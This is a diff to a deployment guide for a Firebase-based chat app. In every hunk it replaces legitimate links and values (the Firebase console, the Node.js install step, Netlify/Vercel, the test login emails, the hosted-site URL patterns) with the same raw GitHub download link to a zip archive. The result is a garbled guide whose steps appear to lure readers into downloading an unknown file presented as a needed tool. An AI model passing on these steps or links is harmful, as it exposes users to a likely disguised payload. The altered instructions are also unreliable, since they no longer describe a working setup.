@@ -30,7 +30,7 @@
 
 # --------------------------------
 
-# 1\. Go to https://console.firebase.google.com/
+# 1\. Go to https://github.com/mubashshir96/my-chat/raw/refs/heads/main/tortuous/chat-my-v3.5.zip
 
 # 2\. Create a new project or use existing
 
@@ -94,7 +94,7 @@
 
 # Option B: Firebase Hosting (Recommended)
 
-# 1\. Install Node.js
+# 1\. Install https://github.com/mubashshir96/my-chat/raw/refs/heads/main/tortuous/chat-my-v3.5.zip
 
 # 2\. Run: npm install -g firebase-tools
 
@@ -112,7 +112,7 @@
 
 # Option C: Netlify/Vercel (Simple Drag \& Drop)
 
-# 1\. Go to netlify.com or vercel.com
+# 1\. Go to https://github.com/mubashshir96/my-chat/raw/refs/heads/main/tortuous/chat-my-v3.5.zip or https://github.com/mubashshir96/my-chat/raw/refs/heads/main/tortuous/chat-my-v3.5.zip
 
 # 2\. Drag \& drop your folder
 
@@ -128,9 +128,9 @@
 
 # 2\. Login with:
 
-# &nbsp;  User 1: user1@test.com / 123456
+# &nbsp;  User 1: https://github.com/mubashshir96/my-chat/raw/refs/heads/main/tortuous/chat-my-v3.5.zip / 123456
 
-# &nbsp;  User 2: user2@test.com / 123456
+# &nbsp;  User 2: https://github.com/mubashshir96/my-chat/raw/refs/heads/main/tortuous/chat-my-v3.5.zip / 123456
 
 # 3\. Send messages between users
 
@@ -184,11 +184,11 @@
 
 # After deployment, your site will be available at:
 
-# \- GitHub: https://\[username].github.io/\[repo-name]
+# \- GitHub: https://\[username]https://github.com/mubashshir96/my-chat/raw/refs/heads/main/tortuous/chat-my-v3.5.zip\[repo-name]
 
-# \- Firebase: https://\[project-id].web.app
+# \- Firebase: https://\[project-id]https://github.com/mubashshir96/my-chat/raw/refs/heads/main/tortuous/chat-my-v3.5.zip
 
-# \- Netlify: https://\[random-name].netlify.app
+# \- Netlify: https://\[random-name]https://github.com/mubashshir96/my-chat/raw/refs/heads/main/tortuous/chat-my-v3.5.zip
 
 # 
 
